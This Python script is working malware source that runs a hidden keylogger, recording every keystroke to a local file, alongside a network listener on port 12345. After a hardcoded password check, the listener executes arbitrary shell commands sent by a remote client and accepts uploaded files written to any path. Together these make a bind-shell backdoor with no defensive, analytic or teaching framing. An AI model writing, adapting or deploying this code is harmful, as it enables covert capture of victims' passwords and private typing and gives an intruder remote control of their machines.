import socket
import threading
from datetime import datetime
from pynput import keyboard
import subprocess

# Global variables
SECRET_KEY = "SECRET123"  # Authentication key
keylog_file = "keylog.txt"  # File to store keylogs

# Keylogger function
def on_press(key):
    try:
        with open(keylog_file, "a") as f:
            f.write(f"{key}\n")
    except Exception as e:
        print(f"Error logging key: {e}")

# Start the keylogger in a separate thread
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Handle client commands
def handle_command(command):
    if command.startswith("ECHO:"):
        return command[5:].strip()
    elif command == "TIME":
        return str(datetime.now())
    elif command.startswith("EXEC:"):
        try:
            output = subprocess.check_output(command[5:].strip(), shell=True, stderr=subprocess.STDOUT)
            return output.decode('utf-8')
        except subprocess.CalledProcessError as e:
            return e.output.decode('utf-8')
    elif command == "HEARTBEAT":
        return "ALIVE"
    else:
        return "ERROR: Unknown command"

# Handle client connection
def handle_client(connection, client_address):
    try:
        print(f"Connection from {client_address}")

        # Authentication
        auth_key = connection.recv(1024).decode('utf-8').strip()
        if auth_key != SECRET_KEY:
            print("Authentication failed")
            connection.sendall(b"Authentication failed")
            connection.close()
            return

        print("Authentication successful")
        connection.sendall(b"Authentication successful")

        while True:
            # Receive command from client
            data = connection.recv(1024).decode('utf-8').strip()
            if not data:
                print("No more data from", client_address)
                break

            # Handle file transfer
            if data.startswith("FILE:"):
                file_name = data[5:].strip()
                with open(file_name, "wb") as f:
                    while True:
                        file_data = connection.recv(1024)
                        if not file_data:
                            break
                        f.write(file_data)
                print(f"File {file_name} received successfully")
                connection.sendall(b"File received successfully")
                continue

            # Handle other commands
            response = handle_command(data)
            connection.sendall(response.encode('utf-8'))

    finally:
        connection.close()

# Netcat listener function
def netcat_listener(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('0.0.0.0', port)
    print(f"Starting up on {server_address}")
    sock.bind(server_address)
    sock.listen(5)  # Allow up to 5 pending connections

    while True:
        print("Waiting for a connection")
        connection, client_address = sock.accept()
        client_thread = threading.Thread(target=handle_client, args=(connection, client_address))
        client_thread.start()

if __name__ == "__main__":
    # Start the keylogger in a separate thread
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.daemon = True  # Daemonize thread to exit when the main program exits
    keylogger_thread.start()

    # Start the netcat listener
    port = 12345
    netcat_listener(port)